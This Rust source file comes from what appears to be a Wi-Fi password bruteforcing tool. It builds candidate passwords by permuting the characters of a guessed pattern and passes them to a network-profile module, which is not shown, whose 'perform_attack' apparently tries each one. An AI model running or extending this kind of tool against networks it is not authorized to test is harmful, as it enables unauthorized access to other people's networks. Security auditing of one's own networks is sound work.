extern crate permutohedron;

use self::permutohedron::heap_recursive;
use config::Config;
use handlers::NetworkXmlProfileHandler;
use network::ProfileNetwork;
use std::io;

const OUTPUT_XML_FILE_PATH: &str = "output.xml";

pub struct WifiBruteforcer<'a> {
  pub config: Config<'a>,
  pub output_xml_path: &'a str,
  pub(crate) profile_network: ProfileNetwork,
  pub(crate) xml_handler: Option<NetworkXmlProfileHandler>,
}

/// The Bruteforcer module responsible for performing the attack.
impl<'a> WifiBruteforcer<'a> {
  /// Creates a new instance of the bruteforcer encapsulates in a Result.
  pub fn new(config: Config<'a>) -> Result<Self, io::Error> {
    match ProfileNetwork::new(config.ssid) {
      Ok(network) => Ok(WifiBruteforcer {
        config,
        output_xml_path: OUTPUT_XML_FILE_PATH,
        profile_network: network,
        xml_handler: None,
      }),
      Err(err) => Err(err),
    }
  }

  /// Generates permutatation of vectors of characters passed in, using
  /// a heap recusive strategy.
  pub(crate) fn permutate_characters(&self, data: Vec<char>) -> Vec<String> {
    let mut data = data.to_owned();
    let mut permutations: Vec<String> = Vec::new();

    heap_recursive(&mut data, |p| {
      let w: String = p.to_vec().into_iter().collect();
      permutations.push(w);
    });

    permutations
  }

  /// Generates all possible passwords based on a previously passed in
  /// guessed pattern or the ASCII characters.
  pub(crate) fn generate_all_possible_password(&self) -> Vec<String> {
    let vals: Vec<char> = self.config.pattern_password.chars().collect();
    let possible_combinations = self.permutate_characters(vals);

    possible_combinations
  }

  /// Make an attempt to successsully connect to a previously configured wireless network.
  // pub(crate) fn bruteforce_network(&self) -> bool {
  //   self.profile_network.connect()
  // }

  /// Triggers the bruteforcer to try all possible combinations to break the network.
  pub fn perform_attack(&mut self) -> Result<Option<String>, io::Error> {
    self.profile_network.perform_attack(&mut WifiBruteforcer::new(self.config).unwrap())
  }
}
